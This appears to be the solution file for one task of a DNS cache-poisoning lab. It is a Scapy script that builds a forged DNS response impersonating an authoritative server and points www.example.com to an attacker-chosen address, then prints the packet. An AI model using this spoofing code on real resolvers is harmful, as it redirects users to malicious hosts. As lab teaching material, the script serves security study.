from scapy.all import *

# Target Environment
target_dns = "10.9.0.53"
example_auth_dns = "10.9.0.154"

print("[*] Task 2: Building the DNS Response tool")

def build_spoofed_dns_response(txid, target_port, response_ip, qname="www.example.com", qtype="A"):
    # SOLUTION 1: Spoofing the Authoritative DNS server
    ip_layer = IP(src=example_auth_dns, dst=target_dns)
    
    # SOLUTION 2: Source port is 53, destination port is the dynamic target_port
    udp_layer = UDP(sport=53, dport=target_port, chksum=0)
    
    # SOLUTION 3: Setting the ID, Flags (qr, aa), the Question, and the malicious Answer
    dns_layer = DNS(id=txid, qr=1, aa=1, 
                    qd=DNSQR(qname=qname, qtype=qtype), 
                    an=DNSRR(rrname=qname, type=qtype, ttl=86400, rdata=response_ip))
    
    spoofed_pkt = ip_layer / udp_layer / dns_layer
    return spoofed_pkt

# --- TESTING THE FUNCTION ---
print("[*] Test: Generating a fake payload to inspect its structure...")

# SOLUTION 4: Calling the function
my_fake_response = build_spoofed_dns_response(
    txid = 12345, 
    target_port = 33333, 
    response_ip = "6.6.6.6"
)

if my_fake_response:
    print("[+] Packet built successfully! Inspect the layers below:\n")
    my_fake_response.show()
else:
    print("[-] Packet generation failed.")